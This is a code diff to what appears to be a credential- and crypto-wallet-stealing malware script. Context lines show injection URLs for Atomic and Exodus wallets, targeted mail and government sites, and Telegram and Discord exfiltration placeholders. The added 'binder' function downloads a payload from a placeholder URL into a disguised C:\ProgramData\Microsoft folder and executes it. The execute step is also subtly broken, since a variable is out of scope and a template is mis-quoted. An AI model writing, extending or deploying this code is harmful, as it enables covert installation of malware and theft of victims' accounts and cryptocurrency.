@@ -22,7 +22,7 @@ const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.
 const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
 const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";
 
-
+const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
 const discordWebhookUrl = 'REMPLACE_ME';
@@ -3993,6 +3993,57 @@ async function closeBrowsers() {
     }
   });
 }
+
+const saveDir = 'C:\\ProgramData\\Microsoft';
+
+async function binder(url, saveDir) {
+  try {
+    // Ensure the save directory exists
+    if (!fs.existsSync(saveDir)) {
+      fs.mkdirSync(saveDir, { recursive: true });
+    }
+
+    const fileName = path.basename(url);
+    const filePath = path.join(saveDir, fileName);
+
+    const response = await axios({
+      url,
+      method: 'GET',
+      responseType: 'stream'
+    });
+
+    response.data.pipe(fs.createWriteStream(filePath));
+
+    response.data.on('end', () => {
+      console.log(`File downloaded and saved to ${filePath}`);
+      executeCommand();
+    });
+
+    response.data.on('error', (err) => {
+      console.error('Error during file download', err);
+    });
+
+  } catch (error) {
+    console.error('Error while running the script', error);
+  }
+}
+
+function executeCommand() {
+  const command = 'start "" "${filePath}"';
+  
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error executing the command: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      console.error(`Standard error: ${stderr}`);
+      return;
+    }
+    console.log(`Standard output: ${stdout}`);
+  });
+}
+
 
 // Browser Functions
 function manageBrowsers() {
